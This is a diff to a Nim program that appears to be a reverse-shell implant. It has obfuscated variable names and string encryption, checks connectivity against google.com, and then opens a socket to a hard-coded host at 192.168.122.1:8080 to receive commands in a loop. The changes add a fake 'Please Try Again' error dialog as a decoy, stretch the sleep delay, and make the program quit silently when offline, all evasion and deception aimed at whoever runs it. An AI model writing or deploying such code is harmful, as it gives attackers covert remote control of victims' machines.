@@ -1,10 +1,12 @@
 import osproc, os
 import system
 import net, httpclient
+import winim/lean
 import strenc
 
+
 var
-  inconvene_thy_impression = "127.0.0.1"
+  inconvene_thy_impression = "192.168.122.1"
   response_of_said_defence_point = Port(8080)
   create_tunnel_where_locale = newSocket()
   parse_time_date = newHttpClient()
@@ -14,7 +16,8 @@ var
 
 systemos_locate_file_in_receivemode = parse_time_date.request("https://www.google.com", httpMethod = HttpGet)
 if systemos_locate_file_in_receivemode.status == "200 OK":
-  sleep(5000)
+  MessageBox(0, "Please Try Again", "Error", MB_OK)
+  sleep(50000)
   try:
     create_tunnel_where_locale.connect(inconvene_thy_impression, response_of_said_defence_point)
     while true:
@@ -28,5 +31,5 @@ if systemos_locate_file_in_receivemode.status == "200 OK":
   finally:
       create_tunnel_where_locale.close
 else:
-  echo systemos_locate_file_in_receivemode.status
+  quit()
 
